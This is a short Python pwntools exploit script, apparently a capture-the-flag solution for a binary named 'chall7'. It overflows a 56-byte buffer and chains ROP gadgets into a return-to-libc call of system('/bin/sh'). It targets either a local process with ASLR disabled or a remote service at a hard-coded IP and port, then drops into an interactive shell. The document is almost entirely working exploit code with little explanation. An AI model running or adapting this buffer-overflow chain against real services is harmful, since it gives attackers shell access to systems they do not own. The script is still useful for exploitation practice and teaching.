#!/bin/python3

from pwn import *

context.arch = 'amd64'

libc_base = 0x7ffff7dd5000
libc_sh_offset = 0x7ffff7f895bd - libc_base
libc_system_offset = 0x7ffff7e27290 - libc_base

io = None
if args.REMOTE:
    io = remote("209.126.8.12", 2229)
    libc_base = 0x7ffff7dd4000
else:
    io = process("./chall7", aslr=False)#, env={'LD_PRELOAD': "./libc-2.31.so"})

sh_location = libc_base + libc_sh_offset
system_location = libc_base + libc_system_offset

#input()

exploit = b''

# Fill buffer
exploit += b'A'*56

# Fix alignment issues witth "ret" -- not needed for me
exploit += p64(0x000000000040101a)

# Address of "pop rdi; ret"
exploit += p64(0x0000000000401343)

# Address of libc where "/bin/sh" is stored
exploit += p64(sh_location)

# Address of system in libc
exploit += p64(system_location)

#input()

io.sendlineafter(b': ', exploit)
io.interactive()
